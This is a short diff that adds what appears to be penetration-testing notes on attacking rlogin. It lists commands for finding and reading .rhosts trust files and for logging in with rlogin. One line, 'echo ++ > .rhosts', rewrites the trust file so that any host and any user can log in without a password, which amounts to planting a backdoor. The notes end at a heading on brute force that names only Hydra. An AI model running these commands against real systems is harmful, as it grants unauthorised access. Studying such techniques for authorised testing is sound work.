@@ -1,0 +1,16 @@
+Rlogin Enumeration
+
+    Find the files
+        find / -name .rhosts
+        locate .rhosts
+    Examine Files
+        cat .rhosts
+    Manual Login
+        rlogin hostname -l username
+        rlogin <IP>
+    Subvert the files
+        echo ++ > .rhosts
+
+Rlogin Brute force
+
+    Hydra 
